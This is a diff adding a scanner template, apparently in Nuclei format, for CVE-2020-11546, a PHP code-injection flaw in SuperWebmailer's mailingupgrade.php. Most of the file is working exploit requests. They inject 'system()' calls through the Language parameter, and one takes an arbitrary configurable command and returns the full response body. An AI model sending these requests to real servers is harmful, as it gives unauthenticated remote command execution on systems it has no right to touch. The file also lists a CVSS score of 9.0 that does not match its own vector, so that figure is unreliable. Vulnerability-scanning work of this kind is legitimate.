@@ -1,0 +1,52 @@
+id: superwebmailer-rce-cve-2020-11546
+info:
+  name: SuperWebmailer Remote Code Execution (CVE-2020-11546)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    SuperWebmailer version 7.21.0.01526 contains an injection vulnerability in the 'Language' parameter of the mailingupgrade.php file, allowing attackers to execute arbitrary PHP code.
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.0
+    cve-id: CVE-2020-11546
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2020-11546
+    - https://www.superwebmailer.de/
+  tags: rce
+variables:
+  cmd: "ls"
+http:
+  - raw:
+      - |
+        POST /mailingupgrade.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        step=1&Language=de{${system("ls")}}&NextBtn=Weiter+%3E
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "ajax_ccea.php"
+          - "ajax_getemailingactions.php"
+        part: body
+  - raw:
+      - |
+        POST /mailingupgrade.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        step=1&Language=de{${system("{{cmd}}")}}&NextBtn=Weiter+%3E
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "(?s)(.*)"
